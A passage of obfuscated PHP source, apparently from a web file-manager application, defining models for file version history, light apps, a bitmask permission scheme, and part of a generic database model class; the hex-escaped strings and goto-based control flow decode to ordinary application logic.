$this->{$_SERVER[$C[1698]][17]}($ḇ[5])->{$_SERVER[$C[1698]][19]}($AČ)->{$_SERVER[$C[1698]][22]}(); goto Dû®; Dû®: if ($a) { $b = $ḇ[24]($a, $ḇ[25], $ḇ[6]); $ḇ[12]($ḇ[30])->{$_SERVER[$C[1698]][31]}($b); $this->{$_SERVER[$C[1698]][19]}($AČ)->{$_SERVER[$C[1698]][32]}(); } return !0; goto Cό; Cσ: $C =& $_SERVER[拘]; $ḇ =& $_SERVER[$C[1698]]; if (!$D) { return !1; } goto f; Cό: } public function setDetail($Dݝ, $F˝ꇅ) { $EÕ =& $_SERVER[拘]; $F녪ي =& $_SERVER[$EÕ[1698]]; return $this->{$_SERVER[$EÕ[1698]][19]}(array($F녪ي[28] => $Dݝ))->{$_SERVER[$EÕ[1698]][51]}(array($F녪ي[9] => $F˝ꇅ)); } public function rollbackToItem($aÎ, $e) { goto aն晨; cǽڨ: $fЃ[12]($fЃ[52])->{$_SERVER[$Dݣ[1698]][19]}(array($fЃ[1] => $aÎ))->{$_SERVER[$Dݣ[1698]][51]}($AƼ); return $this->{$_SERVER[$Dݣ[1698]][19]}(array($fЃ[28] => $e))->{$_SERVER[$Dݣ[1698]][32]}(); goto fߘ; aն晨: $Dݣ =& $_SERVER[拘]; $fЃ =& $_SERVER[$Dݣ[1698]]; $d = $fЃ[12]($fЃ[52])->{$_SERVER[$Dݣ[1698]][53]}($aÎ); goto D; D: $this->{$_SERVER[$Dݣ[1698]][54]}($d); $bߝާ = $this->{$_SERVER[$Dݣ[1698]][49]}($e); $AƼ = array($fЃ[6] => $bߝާ[$fЃ[6]], $fЃ[8] => $bߝާ[$fЃ[8]], $fЃ[3] => USER_ID); goto cǽڨ; fߘ: } public function clearSame($AЉ) { goto AгȤ; F: $C׋ = $a̦[56]($aݛ, $a̦[6]); $D˿ؘ = array(); $aԜއ = array(); goto EԼ; F̑䈙: $a̦[12]($a̦[57])->{$_SERVER[$e[1698]][31]}($D˿ؘ); goto F֟˦; EԼ: foreach ($C׋ as $c獨) { if ($a̦[23]($c獨) <= 1) { continue; } foreach ($c獨 as $aذ) { $D˿ؘ[] = $aذ[$a̦[6]]; $aԜއ[] = $aذ[$a̦[26]]; } } if (!$D˿ؘ) { return; } $this->{$_SERVER[$e[1698]][19]}(array($a̦[26] => array($a̦[29], $aԜއ)))->{$_SERVER[$e[1698]][32]}(); goto F̑䈙; AгȤ: $e =& $_SERVER[拘]; $a̦ =& $_SERVER[$e[1698]]; $aݛ = $this->{$_SERVER[$e[1698]][55]}($AЉ); goto F; F֟˦: } public function userSpace() { $E =& $_SERVER[拘]; $C =& $_SERVER[$E[1698]]; $Dѧʱ = $this->tablePrefix; $C庖 = array($C[2] => USER_ID); $Dϊ = "{$Dѧʱ}\x69\x6f\x5f\146\x69\154\x65\x20\146\151\x6c\145\163\40\x6f\x6e\40\x66\151\154\x65\163\56\x66\x69\154\145\x49\104\40\x3d\x20\x68\151\x73\164\x6f\x72\171\x2e\x66\x69\x6c\x65\x49\x44"; return $this->{$_SERVER[$E[1698]][45]}($C[46])->{$_SERVER[$E[1698]][19]}($C庖)->{$_SERVER[$E[1698]][47]}($Dϊ, $C[48])->{$_SERVER[$E[1698]][58]}($C[8]); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\155\x2e\114\x69\147\x68\x74\101\x70\160"; public $modelType = "\123\171\163\x74\145\x6d\x4f\x70\x74\x69\x6f\156"; public $field = array("\x6e\141\x6d\145", "\147\x72\157\165\160", "\144\145\163\143", "\143\x6f\156\164\x65\156\x74"); public function listData($f쏵 = false, $Bۚ = "\x6d\157\x64\151\x66\171\124\151\x6d\145", $aڢ = true) { return parent::listData($f쏵, $Bۚ, $aڢ); } public function remove($Eī) { $dҶ = $this->{$_SERVER[拘][1461]}($Eī); if (!$dҶ) { return !1; } return parent::remove($dҶ[$_SERVER[拘][414]]); } public function add($e޳) { if ($this->{$_SERVER[拘][1461]}($e޳[$_SERVER[拘][375]])) { return !1; } return parent::insert($e޳); } public function update($E, $c舮) { $A =& $_SERVER[拘]; $eЅٹѿ = $this->{$_SERVER[拘][1461]}($E); $EԌ = $this->{$_SERVER[拘][1461]}($c舮[$A[375]]); if (!$eЅٹѿ || $EԌ && $EԌ[$A[414]] != $eЅٹѿ[$A[414]]) { return !1; } return parent::update($eЅٹѿ[$A[414]], $c舮); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authDefault() { $aʰ =& $_SERVER[拘]; $CΦ袴 = array(array($aʰ[1453] => $aʰ[387]($aʰ[1701]), $aʰ[1702] => $aʰ[1703], $aʰ[1454] => 6, $aʰ[1704] => 1, $aʰ[1705] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($aʰ[1453] => $aʰ[387]($aʰ[1706]), $aʰ[1702] => $aʰ[1707], $aʰ[1454] => 1, $aʰ[1704] => 1, $aʰ[1705] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($aʰ[1453] => $aʰ[387]($aʰ[1708]), $aʰ[1702] => $aʰ[1709], $aʰ[1454] => 2, $aʰ[1704] => 1, $aʰ[1705] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($aʰ[1453] => $aʰ[387]($aʰ[1710]), $aʰ[1702] => $aʰ[1709], $aʰ[1454] => 3, $aʰ[1704] => 1, $aʰ[1705] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($aʰ[1453] => $aʰ[387]($aʰ[1711]), $aʰ[1702] => $aʰ[1712], $aʰ[1454] => 4, $aʰ[1704] => 1, $aʰ[1705] => self::AUTH_SHOW | self::AUTH_VIEW), array($aʰ[1453] => $aʰ[387]($aʰ[1713]), $aʰ[1702] => $aʰ[1714], $aʰ[1454] => 5, $aʰ[1704] => 1, $aʰ[1705] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($aʰ[1453] => $aʰ[387]($aʰ[1715]), $aʰ[1702] => $aʰ[1716], $aʰ[1454] => 7, $aʰ[1704] => 1, $aʰ[1705] => 0)); return $CΦ袴; } public static function authCheck($b, $C˚) { $b = $_SERVER[拘][455]($b); if (($b & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($b & $C˚); } public static function authCheckShow($Dǅ) { return self::authCheck($Dǅ, self::AUTH_SHOW); } public static function authCheckView($Dʩ) { return self::authCheck($Dʩ, self::AUTH_VIEW); } public static function authCheckDownload($cՃĞ) { return self::authCheck($cՃĞ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($cԅ) { return self::authCheck($cԅ, self::AUTH_UPLOAD); } public static function authCheckEdit($d򴿮) { return self::authCheck($d򴿮, self::AUTH_EDIT); } public static function authCheckRemove($Cъγ) { return self::authCheck($Cъγ, self::AUTH_REMOVE); } public static function authCheckShare($E絆ܲ) { return self::authCheck($E絆ܲ, self::AUTH_SHARE); } public static function authCheckComment($DЫ) { return self::authCheck($DЫ, self::AUTH_COMMENT); } public static function authCheckEvent($e䩴) { return self::authCheck($e䩴, self::AUTH_EVENT); } public static function authCheckRoot($e椋) { return self::authCheck($e椋, self::AUTH_ROOT); } public $optionType = "\123\171\163\x74\145\155\x2e\x73\x6f\x75\x72\x63\x65\101\x75\164\150\114\x69\x73\x74"; public $field = array("\156\x61\155\145", "\x61\165\x74\x68", "\154\141\x62\x65\154", "\144\x69\163\160\154\141\x79", "\163\x79\163\x74\145\x6d", "\163\x6f\x72\x74"); public function initData() { $f܏ = $this->{$_SERVER[拘][1718]}(); foreach ($f܏ as $e菕) { $this->{$_SERVER[拘][63]}($e菕); } } public function listData($fл = false, $c = "\x73\157\x72\164", $cܖ = false) { return parent::listData($fл, $c, $cܖ); } public function update($cњ, $bҳ) { $C֪ =& $_SERVER[拘]; $CΘ񂚜 = parent::listData($cњ); $f؎ = $this->{$_SERVER[拘][1461]}($bҳ[$C֪[375]]); if (!$CΘ񂚜 || $f؎ && $f؎[$C֪[414]] != $CΘ񂚜[$C֪[414]]) { return !1; } $this->{$_SERVER[拘][1719]}($bҳ[$C֪[317]]); return parent::update($cњ, $bҳ); } public function remove($B) { $Aܿԏ = parent::listData($B); if (!$Aܿԏ || $Aܿԏ[$_SERVER[拘][460]]) { return !1; } return parent::remove($B); } public function add($Dچʳ = array()) { goto b֨Ѧ; b֨Ѧ: $bᐃ =& $_SERVER[拘]; if ($this->{$_SERVER[拘][1461]}($Dچʳ[$bᐃ[375]])) { return !1; } $E = array($bᐃ[375] => $bᐃ[67], $bᐃ[317] => 1, $bᐃ[1720] => $bᐃ[1721], $bᐃ[1722] => 1, $bᐃ[460] => 0, $bᐃ[1476] => 0); goto fؙ; fؙ: $Dچʳ = $bᐃ[153]($E, $Dچʳ); $e񆓓 = parent::listData(); $c򋿎 = $bᐃ[413]($e񆓓, $bᐃ[67], $bᐃ[1476]); goto b锔; b锔: if ($Dچʳ[$bᐃ[1476]] == 0) { $Dچʳ[$bᐃ[1476]] = empty($c򋿎) ? 0 : $bᐃ[1143]($c򋿎) + 1; } $this->{$_SERVER[拘][1719]}($Dچʳ[$bᐃ[317]]); return parent::insert($Dچʳ); goto c; c: } private function filterAuth(&$F) { goto Fڪ; A: $Aܑ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($bƱΦ as $D) { if (isset($Aܑ[$D])) { $bƱΦ = $eͯǇ[153]($bƱΦ, $Aܑ[$D]); } } $bƱΦ[] = self::AUTH_SHOW; goto Eղ; Fڪ: $eͯǇ =& $_SERVER[拘]; if (!$F) { return; } $Bۊ澈 = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); goto F§; Eղ: $F = $eͯǇ[1723]($eͯǇ[710]($bƱΦ)); goto Eߏ್; F§: $bƱΦ = array(); foreach ($Bۊ澈 as $D) { if ($F & $D) { $bƱΦ[] = $D; } } if ($eͯǇ[176](self::AUTH_ROOT, $bƱΦ)) { $F = $eͯǇ[1723]($Bۊ澈); return; } goto A; Eߏ್: } public function sort($d؜, $E) { $fܑ =& $_SERVER[拘]; $Fȃ = $this->{$_SERVER[拘][504]}(); $E = $E == $fܑ[1601] ? $fܑ[1693] : $fܑ[1694]; $a؞ё = $fܑ[1695]($Fȃ, $fܑ[414], $d؜, $E); foreach ($a؞ё as $Cͻ => $D) { parent::update($D[$fܑ[414]], array($fܑ[1454] => $Cͻ)); } return !0; } } goto FϦҢ; fǺ: class Model { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\142\154\145", "\157\162\144\145\162", "\x61\154\x69\x61\163", "\x68\x61\x76\x69\156\147", "\x67\162\x6f\x75\160", "\154\157\143\x6b", "\144\x69\163\x74\151\x6e\143\164", "\x61\x75\164\157", "\x66\x69\x6c\x74\145\x72", "\x76\x61\x6c\151\144\x61\x74\145", "\x72\x65\x73\x75\x6c\x74", "\142\151\156\144", "\164\157\x6b\x65\156"); public function __construct($Dӻ = '', $d = '', $eȢ = '') { $b =& $_SERVER[拘]; $this->{$_SERVER[拘][984]}(); if (!empty($Dӻ)) { if ($b[165]($Dӻ, $b[348])) { list($this->dbName, $this->name) = $b[4]($b[348], $Dӻ); } else { $this->name = $Dӻ; } } elseif (empty($this->name)) { $this->name = $this->{$_SERVER[拘][985]}(); } if ($b[149]($d)) { $this->tablePrefix = $b[67]; } elseif ($b[67] != $d) { $this->tablePrefix = $d; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : $b[108]($b[986]); } $this->{$_SERVER[拘][987]}(0, empty($this->connection) ? $eȢ : $this->connection); } protected function _checkTableInfo() { $Eן =& $_SERVER[拘]; if (empty($this->fields)) { if ($Eן[108]($Eן[988])) { $b° = $this->dbName ? $this->dbName : $Eן[108]($Eן[114]); $Cλ = $Eן[989]($Eן[990] . $Eן[80]($Eן[715]($b°) . $Eן[348] . $this->name)); if ($Cλ) { $BƷϩ = $Eן[108]($Eן[991]); if (empty($BƷϩ) || $Cλ[$Eן[992]] == $BƷϩ) { $this->fields = $Cλ; return; } } } $this->{$_SERVER[拘][309]}(); } } public function flush() { goto B; B: $Fم񋍼 =& $_SERVER[拘]; $this->db->{$_SERVER[拘][993]}($this->name); $d = $this->db->{$_SERVER[拘][994]}($this->{$_SERVER[拘][995]}()); goto a; Dޑ: if ($Fم񋍼[108]($Fم񋍼[988])) { $a؂ = $this->dbName ? $this->dbName : $Fم񋍼[108]($Fم񋍼[114]); $Fم񋍼[989]($Fم񋍼[990] . $Fم񋍼[80]($Fم񋍼[715]($a؂) . $Fم񋍼[348] . $this->name), $this->fields); } goto f곉; E: foreach ($d as $A˾ => $C) { $Fִ[$A˾] = $C[$Fم񋍼[400]]; if ($C[$Fم񋍼[997]]) { $this->fields[$Fم񋍼[998]] = $A˾; if ($C[$Fم񋍼[999]]) { $this->fields[$Fم񋍼[996]] = !0; } } } $this->fields[$Fم񋍼[1000]] = $Fִ; if ($Fم񋍼[108]($Fم񋍼[991])) { $this->fields[$Fم񋍼[992]] = $Fم񋍼[108]($Fم񋍼[991]); } goto Dޑ; a: if (!$d) { return !1; } $this->fields = $Fم񋍼[766]($d); $this->fields[$Fم񋍼[996]] = !1; goto E; f곉: } public function switchModel($C֑ȵ, $Eȉ˃ = array()) { $A =& $_SERVER[拘]; $d紝 = $A[79]($A[80]($C֑ȵ)) . $A[1001]; if (!$A[82]($d紝)) { $A[76]($d紝 . $A[77]($A[1002])); } $this->_extModel = new $d紝($this->name); if (!empty($Eȉ˃)) { foreach ($Eȉ˃ as $cσ) { $this->_extModel->{$_SERVER[拘][1003]}($cσ, $this->{$cσ}); } } return $this->_extModel; } public function __set($CΎ, $bƽ) { $this->data[$CΎ] = $bƽ; } public function __get($a퇚ߑ) { return isset($this->data[$a퇚ߑ]) ? $this->data[$a퇚ߑ] : null; } public function __isset($C) { return isset($this->data[$C]); } public function __unset($aʴ) { unset($this->data[$aʴ]); } public function __call($a, $A) { $D£ =& $_SERVER[拘]; if ($D£[176]($D£[80]($a), $this->methods, !0)) { $this->options[$D£[80]($a)] = $A[0]; return $this; } elseif ($D£[176]($D£[80]($a), array($D£[1004], $D£[1005], $D£[1006], $D£[1007], $D£[1008]), !0)) { $d = isset($A[0]) ? $A[0] : $D£[167]; $d = $this->db->{$_SERVER[拘][146]}($d); return $this->{$_SERVER[拘][1009]}($D£[84]($a) . $D£[189] . $d . $D£[1010] . $a, $D£[1004]); } elseif ($D£[80]($D£[7]($a, 0, 5)) == $D£[1011]) { $d = $D£[1012]($D£[7]($a, 5)); $C۴ǜ[$d] = $A[0]; return $this->{$_SERVER[拘][501]}($C۴ǜ)->{$_SERVER[拘][502]}(); } elseif ($D£[80]($D£[7]($a, 0, 10)) == $D£[1013]) { $fʹ = $D£[1012]($D£[7]($a, 10)); $C۴ǜ[$fʹ] = $A[0]; return $this->{$_SERVER[拘][501]}($C۴ǜ)->{$_SERVER[拘][1009]}($A[1]); } elseif (isset($this->_scope[$a])) { return $this->{$_SERVER[拘][1014]}($a, $A[0]); } elseif ($D£[89]($this, $a)) { if ($A[$D£[37]($A) - 1] == $a) { $D£[76](__CLASS__ . $D£[91] . $a . $D£[77]($D£[1015])); return; } $A[] = $a; if ($D£[89]($this, $D£[1016])) { $bИף = $D£[90](array($this, $D£[1017]), array($a, $A)); if (!$D£[149]($bИף) && $bИף !== !1) { return $bИף; } } $fό = $D£[90](array($this, $a), $A); if ($D£[89]($this, $D£[1018])) { $bИף = $D£[90](array($this, $D£[1019]), array($a, $A, $fό)); if ($bИף) { return $bИף; } } return $fό; } else { $D£[76](__CLASS__ . $D£[91] . $a . $D£[77]($D£[1015])); return; } } protected function _initialize() { } protected function _facade($fϩ) { $Bק =& $_SERVER[拘]; if (!empty($this->fields)) { foreach ($fϩ as $a => $a) { if (!$Bק[176]($a, $this->fields, !0)) { unset($fϩ[$a]); } elseif ($Bק[148]($a)) { $this->{$_SERVER[拘][1020]}($fϩ, $a); } } } if (!empty($this->options[$Bק[1021]])) { $fϩ = $Bק[159]($this->options[$Bק[1021]], $fϩ); unset($this->options[$Bק[1021]]); } $this->{$_SERVER[拘][1022]}($fϩ); return $fϩ; } protected function _beforeWrite(&$D») { } public function add($d = '', $f = array(), $f = false) { goto BƎ׻; BƎ׻: $Dľ͐ =& $_SERVER[拘]; if (empty($d)) { if (!empty($this->data)) { $d = $this->data; $this->data = array(); } else { $this->error = $Dľ͐[77]($Dľ͐[1023]); return !1; } } $f = $this->{$_SERVER[拘][1024]}($f); goto B֪; fŒ킌: if (!1 !== $FȰ) { $Fհ = $this->{$_SERVER[拘][1028]}(); if ($Fհ) { $d[$this->{$_SERVER[拘][1029]}()] = $Fհ; $this->{$_SERVER[拘][1030]}($d, $f); return $Fհ; } $this->{$_SERVER[拘][1030]}($d, $f); } return $FȰ; goto b͏; B֪: $d = $this->{$_SERVER[拘][1025]}($d); if (!1 === $this->{$_SERVER[拘][1026]}($d, $f)) { return !1; } $FȰ = $this->db->{$_SERVER[拘][1027]}($d, $f, $f); goto fŒ킌; b͏: } protected function _beforeInsert(&$E̲, $CԹ鷵) { } protected function _after_insert($aƃ, $d) { } public function addAll($B, $C = array(), $aܧ = false) { goto b㡍ᒫ; b㡍ᒫ: $dՄα =& $_SERVER[拘]; if (empty($B)) { $this->error = $dՄα[77]($dՄα[1023]); return !1; } $C = $this->{$_SERVER[拘][1024]}($C); goto D廍; D廍: foreach ($B as $Cߋ => $FȲ) { $B[$Cߋ] = $this->{$_SERVER[拘][1025]}($FȲ); } if ($dՄα[89]($this->db, $dՄα[1031])) { $EѲ = $this->db->{$_SERVER[拘][1032]}($B, $C, $aܧ); } else { $this->{$_SERVER[拘][1033]}(); foreach ($B as $Cߋ => $FȲ) { $EѲ = $this->db->{$_SERVER[拘][1027]}($FȲ, $C, $aܧ); } $this->{$_SERVER[拘][1034]}(); } if (!1 !== $EѲ) { $a̎ = $this->{$_SERVER[拘][1028]}(); if ($a̎) { return $a̎; } } goto cÈӎ; cÈӎ: return $EѲ; goto F; F: } public function selectAdd($b = '', $fՆ = '', $D = array()) { $dȯ =& $_SERVER[拘]; $D = $this->{$_SERVER[拘][1024]}($D); if (!1 === ($b͛ = $this->db->{$_SERVER[拘][1035]}($b ? $b : $D[$dȯ[280]], $fՆ ? $fՆ : $this->{$_SERVER[拘][995]}(), $D))) { $this->error = $dȯ[77]($dȯ[1036]); return !1; } else { return $b͛; } } public function save($aϕ = '', $d△ = array()) { goto c쌋; a: $d△ = $this->{$_SERVER[拘][1024]}($d△); $bȣ = $this->{$_SERVER[拘][1029]}(); if (!isset($d△[$A[251]])) { if (isset($aϕ[$bȣ])) { $Eμڙ[$bȣ] = $aϕ[$bȣ]; $d△[$A[251]] = $Eμڙ; unset($aϕ[$bȣ]); } else { $this->error = $A[77]($A[1036]); return !1; } } goto c݊; c쌋: $A =& $_SERVER[拘]; if (empty($aϕ)) { if (!empty($this->data)) { $aϕ = $this->data; $this->data = array(); } else { $this->error = $A[77]($A[1023]); return !1; } } $aϕ = $this->{$_SERVER[拘][1025]}($aϕ); goto a; Eۯ: if (!1 !== $AѮ) { if (isset($b)) { $aϕ[$bȣ] = $b; } $this->{$_SERVER[拘][1039]}($aϕ, $d△); } return $AѮ; goto aŜ; c݊: if ($A[93]($d△[$A[251]]) && isset($d△[$A[251]][$bȣ])) { $b = $d△[$A[251]][$bȣ]; } if (!1 === $this->{$_SERVER[拘][1037]}($aϕ, $d△)) { return !1; } $AѮ = $this->db->{$_SERVER[拘][1038]}($aϕ, $d△); goto Eۯ; aŜ: } protected function _beforeUpdate(&$d, $CÊ) { } protected function _afterUpdate($fϬ, $dͬ) { } public function delete($d񛍆 = array()) { goto b; b: $bƥ =& $_SERVER[拘]; if (empty($d񛍆) && empty($this->options[$bƥ[251]])) { if (!empty($this->data) && isset($this->data[$this->{$_SERVER[拘][1029]}()])) { return $this->{$_SERVER[拘][308]}($this->data[$this->{$_SERVER[拘][1029]}()]); } else { return !1; } } $CѰ㱡 = $this->{$_SERVER[拘][1029]}(); goto cÃ; cÃ: if ($bƥ[68]($d񛍆) || $bƥ[66]($d񛍆)) { if ($bƥ[165]($d񛍆, $bƥ[119])) { $F[$CѰ㱡] = array($bƥ[1040], $d񛍆); } else { $F[$CѰ㱡] = $d񛍆; } $this->options[$bƥ[251]] = $F; } $d񛍆 = $this->{$_SERVER[拘][1024]}(); if ($bƥ[93]($d񛍆[$bƥ[251]]) && isset($d񛍆[$bƥ[251]][$CѰ㱡])) { $f唞 = $d񛍆[$bƥ[251]][$CѰ㱡]; } goto Eچء; Eچء: $a꤫ӎ = $this->db->{$_SERVER[拘][308]}($d񛍆); if (!1 !== $a꤫ӎ) { $A = array(); if (isset($f唞)) { $A[$CѰ㱡] = $f唞; } $this->{$_SERVER[拘][1041]}($A, $d񛍆); } return $a꤫ӎ; goto B; B: } protected function _after_delete($f, $E) { } public function select($C喂ԝ = array()) { goto e; e: $D젵 =& $_SERVER[拘]; if ($D젵[66]($C喂ԝ) || $D젵[68]($C喂ԝ)) { $a͝Ʋ = $this->{$_SERVER[拘][1029]}(); if ($D젵[165]($C喂ԝ, $D젵[119])) { $A߃[$a͝Ʋ] = array($D젵[1040], $C喂ԝ); } else { $A߃[$a͝Ʋ] = $C喂ԝ; } $this->options[$D젵[251]] = $A߃; } elseif (!1 === $C喂ԝ) { $C喂ԝ = $this->{$_SERVER[拘][1024]}(); return $D젵[181] . $this->db->{$_SERVER[拘][233]}($C喂ԝ) . $D젵[194]; } $C喂ԝ = $this->{$_SERVER[拘][1024]}(); goto Bߗ; Bٵ: $this->{$_SERVER[拘][1043]}($fŢ, $C喂ԝ); return $fŢ; goto bϽٸ; Bߗ: $fŢ = $this->db->{$_SERVER[拘][1042]}($C喂ԝ); if (!1 === $fŢ) { return !1; } if (empty($fŢ)) { return null; } goto Bٵ; bϽٸ: } protected function _afterSelect(&$cʿݧ, $d˙) { } public function buildSql($a = array()) { $E =& $_SERVER[拘]; $a = $this->{$_SERVER[拘][1024]}($a); return $E[181] . $this->db->{$_SERVER[拘][233]}($a) . $E[194]; } public function optionsValue($dЌښՇ = null) { $A̎ҋ =& $_SERVER[拘]; if ($A̎ҋ[149]($dЌښՇ)) { return $this->options; } elseif ($A̎ҋ[93]($dЌښՇ)) { $this->options = $A̎ҋ[153]($this->options, $dЌښՇ); } } protected function _parseOptions($A = array()) { goto e; e: $C =& $_SERVER[拘]; if ($C[93]($A)) { $A = $C[153]($this->options, $A); } $this->options = array(); goto Dⴌ; Dⴌ: if (!isset($A[$C[239]])) { $A[$C[239]] = $this->{$_SERVER[拘][995]}(); $E͓ = $this->fields; } else { $E͓ = $this->{$_SERVER[拘][1044]}(); } if (!empty($A[$C[1045]])) { $A[$C[239]] .= $C[168] . $A[$C[1045]]; } $A[$C[234]] = $this->name; goto bѫ; bѫ: if (isset($A[$C[251]]) && $C[93]($A[$C[251]]) && !empty($E͓) && !isset($A[$C[282]]) && !isset($A[$C[239]])) { foreach ($A[$C[251]] as $D => $c) { $D = $C[70]($D); if ($C[176]($D, $E͓, !0)) { if ($C[148]($c)) { $this->{$_SERVER[拘][1020]}($A[$C[251]], $D); } } elseif (!$C[68]($D) && $C[183] != $C[7]($D, 0, 1) && !1 === $C[165]($D, $C[348]) && !1 === $C[165]($D, $C[189]) && !1 === $C[165]($D, $C[188]) && !1 === $C[165]($D, $C[193])) { unset($A[$C[251]][$D]); } } } $this->{$_SERVER[拘][1046]}($A); return $A; goto b; b: } protected function _options_filter(&$C) { } protected function _parseType(&$C, $B瑽) { $a =& $_SERVER[拘]; if (empty($this->options[$a[247]][$a[91] . $B瑽])) { $C׻Œ = $a[80]($this->fields[$a[1000]][$B瑽]); if (!1 !== $a[165]($C׻Œ, $a[1047])) { } elseif (!1 === $a[165]($C׻Œ, $a[1048]) && !1 !== $a[165]($C׻Œ, $a[1049])) { $C[$B瑽] = $a[455]($C[$B瑽]); } elseif (!1 !== $a[165]($C׻Œ, $a[1050]) || !1 !== $a[165]($C׻Œ, $a[1051])) { $C[$B瑽] = $a[1052]($C[$B瑽]); } elseif (!1 !== $a[165]($C׻Œ, $a[1053])) { $C[$B瑽] = (bool) $C[$B瑽]; } } } public function find($E뮜 = array()) { goto bǿ; Aȋ: if (empty($fǉ)) { return null; } $this->data = $fǉ[0]; $this->{$_SERVER[拘][1054]}($this->data, $E뮜); goto eͱꇐ; bǿ: $C뒹 =& $_SERVER[拘]; if ($C뒹[68]($E뮜) || $C뒹[66]($E뮜)) { $C䪞ݞ[$this->{$_SERVER[拘][1029]}()] = $E뮜; $this->options[$C뒹[251]] = $C䪞ݞ; } $this->options[$C뒹[255]] = 1; goto bƒ; bƒ: $E뮜 = $this->{$_SERVER[拘][1024]}(); $fǉ = $this->db->{$_SERVER[拘][1042]}($E뮜); if (!1 === $fǉ) { return !1; } goto Aȋ; eͱꇐ: if (!empty($this->options[$C뒹[1055]])) { return $this->{$_SERVER[拘][1056]}($this->data, $this->options[$C뒹[1055]]); } return $this->data; goto e; e: } protected function _afterFind(&$fĐ, $EН䦍) { } protected function returnResult($D, $Cّ㮭 = '') { $F壞 =& $_SERVER[拘]; if ($Cّ㮭) { if ($F壞[1057]($Cّ㮭)) { return $F壞[1058]($Cّ㮭, $D); } switch ($F壞[80]($Cّ㮭)) { case $F壞[1059]: return $F壞[297]($D); case $F壞[1060]: return $F壞[1061]($D); } } return $D; } public function parseFieldsMap($cˋȒ, $d踴 = 1) { if (!empty($this->_map)) { foreach ($this->_map as $cڱ؃ => $A) { if ($d踴 == 1) { if (isset($cˋȒ[$A])) { $cˋȒ[$cڱ؃] = $cˋȒ[$A]; unset($cˋȒ[$A]); } } else { if (isset($cˋȒ[$cڱ؃])) { $cˋȒ[$A] = $cˋȒ[$cڱ؃]; unset($cˋȒ[$cڱ؃]); } } } } return $cˋȒ; } public function setField($cߢ, $Bۡ = '') { if ($_SERVER[拘][93]($cߢ)) { $dϝ = $cߢ; } else { $dϝ[$cߢ] = $Bۡ; } return $this->{$_SERVER[拘][1062]}($dϝ); } public function setAdd($A, $E = 1) { $E =& $_SERVER[拘]; $f޸Ո = $A . $E[912] . $E; if ($E < 0) { $f޸Ո = $A . $E; } return $this->{$_SERVER[拘][1063]}($A, array($E[145], $f޸Ո)); } public function getField($A욌, $f = null) { $eܲ =& $_SERVER[拘]; $f暑[$eܲ[280]] = $A욌; $f暑 = $this->{$_SERVER[拘][1024]}($f暑); $A욌 = $eܲ[70]($A욌); if ($eܲ[165]($A욌, $eܲ[119])) { if (!isset($f暑[$eܲ[255]])) { $f暑[$eܲ[255]] = $eܲ[68]($f) ? $f : $eܲ[67]; } $Dͺš = $this->db->{$_SERVER[拘][1042]}($f暑); if (!empty($Dͺš)) { goto E; A: foreach ($Dͺš as $E) { $d = $E[$d]; if (2 == $A) { $e󺞺[$d] = $E[$DŒܖ]; } else { $e󺞺[$d] = $eܲ[66]($f) ? $eܲ[152]($f, $E) : $E; } } return $e󺞺; goto aɉ; e: $DŒܖ = $eܲ[1064]($A욌); $e󺞺 = array(); $A = $eܲ[37]($b慭); goto A; E: $b慭 = $eܲ[4]($eܲ[119], $A욌); $A욌 = $eܲ[766]($Dͺš[0]); $d = $eܲ[1064]($A욌); goto e; aɉ: } } else { if (!0 !== $f) { $f暑[$eܲ[255]] = $eܲ[68]($f) ? $f : 1; } if ($f === $eܲ[1004]) { unset($f暑[$eܲ[255]]); } $E = $this->db->{$_SERVER[拘][1042]}($f暑); if (!empty($E)) { if ($f === $eܲ[1004]) { return $eܲ[1065]($E[0]); } if (!0 !== $f && 1 == $f暑[$eܲ[255]]) { return $eܲ[1065]($E[0]); } foreach ($E as $dم޸) { $A[] = $dم޸[$A욌]; } return $A; } } return null; } public function create($E܊ܦ = '', $e = '') { goto dǇ; c֣: $E܊ܦ = $this->{$_SERVER[拘][1067]}($E܊ܦ, 0); $e = $e ? $e : (!empty($E܊ܦ[$this->{$_SERVER[拘][1029]}()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$eа[280]])) { $dǖ = $this->options[$eа[280]]; unset($this->options[$eа[280]]); } elseif ($e == THINK_MODEL_INSERT && 